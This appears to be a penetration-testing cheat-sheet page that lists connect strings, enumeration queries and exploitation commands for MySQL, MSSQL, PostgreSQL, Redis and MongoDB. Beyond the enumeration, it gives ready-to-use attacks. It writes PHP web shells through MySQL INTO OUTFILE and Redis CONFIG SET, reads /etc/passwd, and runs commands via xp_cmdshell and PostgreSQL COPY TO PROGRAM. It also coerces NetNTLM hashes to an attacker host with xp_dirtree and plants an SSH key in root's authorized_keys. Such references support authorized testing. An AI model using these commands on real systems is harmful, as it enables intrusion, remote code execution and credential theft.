---
title: Databases (MySQL/MSSQL/Postgres/Redis/Mongo)
category: enumeration
description: Quick connect strings and built-in enumeration commands.
tags: [database, mysql, mssql, postgres, redis, mongo]
os: [any]
ports: [1433, 3306, 5432, 6379, 27017]
order: 50
---

## MySQL / MariaDB (3306)

```bash
nmap -p3306 -sCV --script "mysql-info,mysql-empty-password,mysql-users,mysql-databases" {{RHOST}}
mysql -h {{RHOST}} -u {{USER}} -p
# Inside:
# SHOW DATABASES; USE db; SHOW TABLES; SELECT user,authentication_string FROM mysql.user;
# SELECT @@version, @@datadir, @@hostname, user();
# SELECT LOAD_FILE('/etc/passwd');
# SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/x.php';
```

## MSSQL (1433)

```bash
nmap -p1433 -sCV --script "ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info" {{RHOST}}
impacket-mssqlclient {{DOMAIN}}/{{USER}}:'pass'@{{RHOST}} -windows-auth
# Inside:
# SELECT @@version;  SELECT system_user;  SELECT name FROM sys.databases;
# EXEC sp_linkedservers;  EXEC ('SELECT @@version') AT [LINKED];
# enable_xp_cmdshell; xp_cmdshell 'whoami';
# EXEC xp_dirtree '\\{{LHOST}}\share';  -- coerce NetNTLM hash
```

## PostgreSQL (5432)

```bash
nmap -p5432 -sCV --script "pgsql-brute" {{RHOST}}
psql -h {{RHOST}} -U {{USER}} -d postgres
# \l   \dt   \du
# SELECT version(); SELECT current_user, current_database();
# COPY (SELECT '') TO PROGRAM 'id';   -- RCE if superuser
# CREATE TABLE t(c text); COPY t FROM '/etc/passwd';
```

## Redis (6379) — often unauthenticated

```bash
redis-cli -h {{RHOST}}
INFO; CONFIG GET *; KEYS *; CLIENT LIST
# Webshell via dir + dbfilename
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['c']); ?>"
SAVE
# SSH key drop on victim
redis-cli -h {{RHOST}} flushall
( echo; cat ~/.ssh/id_rsa.pub; echo ) | redis-cli -h {{RHOST}} -x set crackit
redis-cli -h {{RHOST}} config set dir /root/.ssh/
redis-cli -h {{RHOST}} config set dbfilename authorized_keys
redis-cli -h {{RHOST}} save
```

## MongoDB (27017)

```bash
nmap -p27017 -sCV --script "mongodb-info,mongodb-databases" {{RHOST}}
mongosh "mongodb://{{RHOST}}:27017"
# show dbs; use admin; show users; db.runCommand({listDatabases:1})
```
